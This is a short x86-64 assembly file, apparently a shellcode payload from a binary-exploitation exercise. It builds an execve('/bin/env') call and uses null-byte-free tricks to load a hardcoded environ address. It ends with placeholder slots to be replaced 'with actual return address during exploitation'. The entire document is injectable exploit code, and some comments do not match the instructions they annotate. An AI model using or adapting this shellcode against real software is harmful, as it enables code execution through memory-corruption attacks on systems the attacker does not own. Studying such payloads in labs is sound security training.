          bits 64
            ; find out where we are
start:     ; your code starts here

    ; Step 1 Setup "/bin/env" String

    ; Clear rax to use as a null terminator
    xor rax, rax

    ; Push null byte (0x00) onto the stack
    push rax

    ; Push the string "/bin/env" onto the stack in reverse order 0x766e652f6e69622f
    mov rbx, '/bin/env'
    push rbx

    ; Set rdi to point to "/bin/env" on the stack
    mov rdi, rsp

    ; Step 2 Setup argv Array

    ; Push null terminator for argv
    push rax

    ; Push pointer to "/bin/env" as argv[0]
    push rdi

    ; Set rsi to point to argv array
    mov rsi, rsp

    ; Step 3 Setup rdx with environ Address

    ; Clear rdx to start building the address without null bytes
    xor rdx, rdx

    ; Load lower 16 bits with part of environ address 0xfbe6
    mov dx, 0x7fff

    ; Shift rdx left by 32 bits to make space for the higher part
    shl rdx, 32

    ; Load lower 32 bits of rcx with the remaining part of environ address
    mov ecx, 0xf7fbe6aa

    ; Clear lower 8 bits of rcx to avoid null bytes
    xor cl, cl

    ; Combine rdx and rcx to form the full environ address
    or rdx, rcx

    ; Dereference rdx to get the address of environ
    mov rdx, [rdx]

    ; Step 4 Execute execve("/bin/env", argv, environ)

    ; Set rax to 59 (0x3B) 
    mov al, 0x3b

    ; Make the syscall
    syscall

    ; Step 5 Exit Cleanly

    ; Move the return value of execve to rdi (exit code)
    mov rdi, rax

    ; Set rax to 0x3C for exit system call
    mov al, 0x3c

    ; Make the syscall
    syscall

    ; Step 6 Reserved Space

    ; Reserve space for the return address
    dq 0xffffffffffffffff  ; Replace with actual return address during exploitation
    dq 0xffffffffffffffff
    dq 0xffffffffffffffff
    dq 0xffffffffffffffff
    dq 0xffffffffffffffff
    end: dd end-start
